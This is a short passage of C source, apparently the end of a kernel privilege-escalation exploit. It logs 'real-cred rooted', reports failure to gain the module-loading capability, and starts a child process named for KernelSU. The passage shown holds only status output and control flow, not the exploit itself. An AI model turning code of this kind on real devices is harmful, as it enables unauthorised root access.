			dprintf(STDOUT_FILENO,
				"[ksu] FAIL=cap_sys_module_not_achieved; finit blocked\n");
			for (;;)
				pause();
		}
	}
	dprintf(STDOUT_FILENO, "[cred] real-cred rooted, child=%d\n",
		g_cred_child_pid);
	start_child_ksu();
	for (;;)
		pause();
}

